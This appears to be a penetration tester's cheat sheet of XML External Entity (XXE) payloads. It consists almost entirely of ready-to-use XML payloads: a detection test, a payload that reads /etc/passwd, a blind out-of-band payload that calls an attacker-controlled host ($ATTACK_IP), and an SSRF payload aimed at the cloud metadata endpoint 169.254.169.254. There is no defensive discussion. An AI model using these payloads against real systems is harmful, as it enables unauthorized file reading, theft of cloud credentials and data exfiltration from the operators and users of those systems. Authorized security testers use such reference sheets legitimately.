# XXE (XML External Entity)

## Detection
```xml
<!-- Submit XML to the application, test with: -->
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY test "Hello">
]>
<root>&test;</root>
<!-- If it returns "Hello", XXE is present -->
```

## File Read
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

## Blind XXE (Out-of-Band)
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://$ATTACK_IP/xxe-test">
]>
<root>&xxe;</root>
```

## XXE to SSRF
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>
```
